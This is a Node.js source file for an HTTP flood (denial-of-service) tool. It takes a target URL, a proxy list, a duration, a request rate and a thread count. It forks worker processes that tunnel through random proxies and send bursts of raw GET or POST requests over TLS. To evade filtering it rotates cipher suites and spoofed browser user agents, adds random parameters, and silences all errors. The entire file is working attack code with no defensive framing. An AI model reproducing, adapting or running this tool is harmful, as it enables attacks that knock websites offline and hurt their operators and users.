



process.on('uncaughtException', function(er) {
    //console.error(er)
});
process.on('unhandledRejection', function(er) {
    //console.error(er)
});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const randstr = require('randomstring')
const url = require('url');

var path = require("path");
const cluster = require('cluster');

function ra() {
    const rsdat = randstr.generate({
        "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length":4
    });
    return rsdat;
}

let headerbuilders;

let COOKIES = undefined;
let POSTDATA = undefined;

var fileName = __filename;
var file = path.basename(fileName);
let randomparam = false;

if (process.argv.length < 8){
    console.log('node ' + file + ' <MODE> <host> <proxies> <duration> <rate> <threads> (options cookie="" postdata="" randomstring="" headerdata="")');
    process.exit(0);
}

process.argv.forEach((ss) => {
    if (ss.includes("cookie=")){
        COOKIES = ss.slice(7);
    } else if (ss.includes("postdata=")){
        if (process.argv[2].toUpperCase() != "POST"){
            console.error("Method Invalid (Has Postdata But Not POST Method)")
            process.exit(1);
        }
        POSTDATA = ss.slice(9);
    } else if (ss.includes("randomstring=")){
        randomparam = ss.slice(13);
        console.log("(!) Custom RandomString");
    } else if (ss.includes("headerdata=")){
        headerbuilders = "";
        const hddata = ss.slice(11).split('""')[0].split("&");
        for (let i = 0; i < hddata.length; i++) {
            const head = hddata[i].split("=")[0];
            const dat = hddata[i].split("=")[1];
            headerbuilders += `\r\n${head}: ${dat}`
        }
    }
});
if (COOKIES !== undefined){
    console.log("(!) Custom Cookie Mode");
} else {
    COOKIES = ""
}
if (headerbuilders !== undefined){
}
if (POSTDATA !== undefined){
} else {
    POSTDATA = ""
}

if (cluster.isMaster){
    for (let i = 0; i < process.argv[7]; i++){
        cluster.fork();
        console.log(`(!) Threads ${i} Started Attacking`);
    }

    setTimeout(() => {
        process.exit(1);
    }, process.argv[5] * 1000);
} else {
    startflood();
}

var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
var rate = process.argv[6];
var target_url = process.argv[3];
const target = target_url.split('""')[0];

var parsed = url.parse(target);
process.setMaxListeners(0);

const cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256",
    "AES256-SHA256:AES128-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA",
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA",
    "AES128-GCM-SHA256:AES128-SHA:DHE-RSA-AES128-SHA",
    "ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305",
    "AES256-GCM-SHA384:AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
];

const UAs = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    // Firefox
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0',
    // Safari
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
];

function startflood(){
    if (process.argv[2].toUpperCase() == "POST"){
        if (randomparam){
            setInterval(() => {

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        //open raw request
                        var tlsConnection = tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            socket: socket
                        }, function () {
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("POST" + ' ' + `${parsed.path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
                
                        tlsConnection.on('error', function(data) {
                            tlsConnection.end();
                            tlsConnection.destroy();
                        });
                
                        tlsConnection.on('data', function (data) {
                            return;
                        });
                    });
                    req.end();
                });
        } else {
            setInterval(() => {

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        //open raw request
                        var tlsConnection = tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            socket: socket
                        }, function () {
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("POST" + ' ' + parsed.path.replace("%RAND%",ra()) + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
                
                        tlsConnection.on('error', function(data) {
                            tlsConnection.end();
                            tlsConnection.destroy();
                        });
                
                        tlsConnection.on('data', function (data) {
                            return;
                        });
                    });
                    req.end();
                });
        }
    } else if (process.argv[2].toUpperCase() == "GET"){
        if (randomparam) {
            setInterval(() => {

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        //open raw request
                        var tlsConnection = tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            socket: socket
                        }, function () {
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
                
                        tlsConnection.on('error', function(data) {
                            tlsConnection.end();
                            tlsConnection.destroy();
                        });
                    });
                    req.end();
                });
        } else {
            setInterval(() => {

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        //open raw request
                        var tlsConnection = tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            socket: socket
                        }, function () {
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%",ra())}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
                
                        tlsConnection.on('error', function(data) {
                            tlsConnection.end();
                            tlsConnection.destroy();
                        });
                        tlsConnection.on('data', function(data) {
                        });
                    });
                    req.end();
                });
        }
    }
}
